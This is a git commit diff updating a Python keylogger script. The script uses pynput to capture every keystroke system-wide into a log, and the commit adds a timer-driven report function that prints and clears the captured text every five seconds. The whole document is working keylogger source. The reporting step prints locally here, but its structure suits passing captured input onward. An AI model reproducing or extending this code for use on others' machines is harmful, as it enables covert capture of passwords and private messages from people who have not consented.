18ec9d23458c92d1f9a2de1e293a6c1bf46eec92
root <sumeetkhillare10@gmail.com>
2020-05-13 19:59:46 -0400

    keylogger updated

--- Keylogger/keylogger.py
+++ Keylogger/keylogger.py
@@ -1,33 +1,29 @@
 # #!/usr/bin/env python
-# import pynput.keyboard
-#
-#
-# def process_key_press(key):
-#     print(key)
-#
-#
-# keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
-# with keyboard_listener:
-#     keyboard_listener.join()
-
-
-# !/usr/bin/env python3
-
-from pynput import keyboard
-
+import pynput.keyboard
+import threading
 log = ""
-def on_press(key):
+def process_key_press(key):
     global log
     try:
         log = log + str(format(key.char))
-        print(log)
+        #print(log)
     except AttributeError:
         if key == key.space:
             log = log + " "
         else:
             log = log + " "+str(key)+" "
-        print(log)
+        #print(log)
 
-with keyboard.Listener(
-        on_press=on_press) as listener:
-    listener.join()
+
+def report():
+    global log
+    print(log)
+    log=""
+    timer = threading.Timer(5,report)
+    timer.start()
+
+keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
+
+with keyboard_listener:
+    report()
+    keyboard_listener.join()
